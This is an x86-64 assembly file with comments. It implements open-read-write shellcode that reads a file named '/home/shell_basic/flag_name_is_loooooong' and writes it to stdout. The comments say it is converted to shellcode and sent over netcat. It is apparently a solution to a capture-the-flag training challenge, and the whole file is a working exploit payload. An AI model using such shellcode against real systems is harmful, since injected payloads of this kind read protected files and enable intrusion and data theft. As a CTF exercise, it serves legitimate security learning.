; This assembly code represents the ORW (Open-Read-Write) system call.
; The string allocation part of the assembly code refers to the result of `sh-write-string.py`
; This code is converted to shellcode in the `shell-code.sh` script and passed to the system via netcat.

section .text
global _start
_start:
    mov rax, 0x0000000000000000    ; \0
    push rax
    mov rax, 0x676e6f6f6f6f6f6f    ; oooooong
    push rax
    mov rax, 0x6c5f73695f656d61    ; ame_is_l
    push rax
    mov rax, 0x6e5f67616c662f63    ; c/flag_n
    push rax
    mov rax, 0x697361625f6c6c65    ; ell_basi
    push rax
    mov rax, 0x68732f656d6f682f    ; /home/sh
    push rax
    mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
    xor rsi, rsi    ; rsi = 0 ; RD_ONLY
    xor rdx, rdx    ; rdx = 0
    mov rax, 2      ; rax = 2 ; syscall_open
    syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)

    ; The return value of the syscall is stored in rax.
    ; Therefore, the fd of `/home/shell_basic/flag_name_is_loooooong` obtained by open is stored in rax.
    ; Assign rax to rdi as the first argument of read.

    mov rdi, rax      ; Set rdi to fd
    mov rsi, rsp
    sub rsi, 0x30     ; Set rsi to rsp-0x30 (buf)
    mov rdx, 0x30     ; Set rdx to 0x30 (len)
    mov rax, 0x0      ; Set rax to 0 (syscall_read)
    syscall           ; Call the read syscall with (fd, buf, 0x30)

    mov rdi, 1        ; Set rdi to 1 (stdout)
    mov rax, 0x1      ; Set rax to 1 (syscall_write)
    syscall           ; Call the write syscall with (fd, buf, 0x30)
